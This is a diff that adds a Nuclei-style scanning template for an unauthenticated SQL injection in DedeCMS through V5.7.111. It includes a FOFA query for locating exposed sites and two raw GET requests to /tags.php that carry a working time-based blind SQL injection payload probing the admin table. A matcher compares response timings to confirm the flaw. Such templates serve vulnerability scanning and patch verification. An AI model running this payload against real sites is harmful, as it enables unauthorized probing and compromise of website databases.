@@ -1,0 +1,32 @@
+id: dedecms-sqli-unauth
+info:
+  name: dedecms前台sql注入
+  author: status
+  severity: critical
+  description: 版本<=V5.7.111。fofa:=app="dedecms"&& icon_hash="-47597126"
+  remediation: Fixed in version V5.7.112
+  reference:
+    - 知识星球搜dedecms
+  tags: dedecms,sqli,unauth
+
+requests:
+  - raw:
+      - |
+        GET /tags.php?tag=a/alias/11awdaw%27and{`\%27`%20id}%3E0.1+or+if(exists(select+*+from+%23@__admin+where+userid+like%27admin%27),(select+count(*)+from+information_schema.columns+A,information_schema.tables+B),1)--%20\\ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+      - |
+        GET /tags.php?tag=a/alias/11awdaw%27and{`\%27`%20id}%3E0.1+or+if(exists(select+*+from+%23@__admin+where+userid+like%27adaaaamin%27),(select+count(*)+from+information_schema.columns+A,information_schema.tables+B),1)--%20\\ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>duration_2'
+          - 'status_code_1 == 200 && status_code_2 == 200'
+        condition: and
+
+# Enhanced by mp on 2022/05/23
